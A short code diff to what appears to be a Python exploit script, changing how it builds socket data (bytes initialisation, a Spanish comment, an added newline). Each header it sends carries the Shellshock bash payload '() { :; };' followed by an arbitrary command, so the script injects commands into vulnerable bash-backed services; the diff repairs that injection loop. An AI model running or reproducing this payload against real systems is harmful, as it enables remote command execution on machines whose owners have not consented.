@@ -62,9 +62,10 @@ data = netFormat("data")
 s.send(data)
 s.recv(2048*4)
 
-data = ''
+data = b""  # Inicializar data como un objeto de tipo bytes
 for h in headers:
-    data += netFormat(h + ":() { :; };" + cmd)
+    header_line = h + ":() { :; };" + cmd + "\n"
+    data += netFormat(header_line)
 
 data += netFormat(cmd)
 
